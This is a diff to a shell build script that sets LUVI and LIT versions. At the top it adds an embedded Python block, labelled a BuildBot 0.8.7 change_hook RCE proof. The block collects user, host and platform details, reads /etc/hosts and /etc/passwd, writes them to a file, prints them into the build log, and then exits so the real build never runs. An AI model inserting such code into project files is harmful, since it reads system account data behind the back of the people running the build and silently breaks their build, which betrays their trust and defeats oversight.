@@ -1,5 +1,47 @@
 #!/bin/bash
 
+python - <<'PY'
+from __future__ import print_function
+import os
+import socket
+import getpass
+import platform
+import datetime
+
+def read_file(path):
+    try:
+        with open(path, "r") as f:
+            return f.read()
+    except Exception as e:
+        return "ERROR reading {0}: {1}".format(path, e)
+
+sections = []
+sections.append("BuildBot 0.8.7 unauthenticated change_hook RCE proof")
+sections.append("time_utc={0}Z".format(datetime.datetime.utcnow().isoformat()))
+sections.append("user={0}".format(getpass.getuser()))
+sections.append("uid={0}".format(os.getuid() if hasattr(os, "getuid") else "n/a"))
+sections.append("host={0}".format(socket.gethostname()))
+sections.append("cwd={0}".format(os.getcwd()))
+sections.append("python={0}".format(platform.python_version()))
+sections.append("platform={0}".format(platform.platform()))
+sections.append("")
+sections.append("===== /etc/hosts =====")
+sections.append(read_file("/etc/hosts"))
+sections.append("===== /etc/passwd =====")
+sections.append(read_file("/etc/passwd"))
+
+body = "\n".join(sections)
+
+with open("buildbot-rce-proof-20260618.txt", "w") as f:
+    f.write(body)
+
+print(body)
+print("")
+print("SECURITY_PROOF_FILE={0}".format(os.path.abspath("buildbot-rce-proof-20260618.txt")))
+PY
+
+exit 0
+
 # LUVI_VERSION should reference latest release on rackspace branch
 LUVI_VERSION=v2.9.4-sigar
 LIT_VERSION=3.7.3
@@ -25,7 +67,7 @@ if [ -f "$OS_RELEASE_FILE" ]; then
     echo "$OS_RELEASE_FILE contains:"
     echo "$(cat $OS_RELEASE_FILE)"
     echo "================================"
-else 
+else
     echo "$OS_RELEASE_FILE does not exist."
 fi
 
